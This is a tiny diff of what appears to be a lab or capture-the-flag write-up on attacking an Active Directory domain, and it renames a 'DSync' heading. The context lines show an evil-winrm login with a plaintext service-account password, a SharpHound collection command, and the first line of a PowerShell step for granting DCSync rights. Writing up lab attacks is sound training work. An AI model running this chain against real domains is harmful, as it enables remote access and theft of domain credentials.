@@ -53,7 +53,7 @@ evil-winrm -i $IP -u svc-alfresco -p s3rvice
 .\SharpHound.exe -c all --zipfilename ad-data-kick
 ```
 
-##### DSync
+##### Add DSync rights
 ```powershell
 $SecPassword = ConvertTo-SecureString 'password' -AsPlainText -Force
 ```
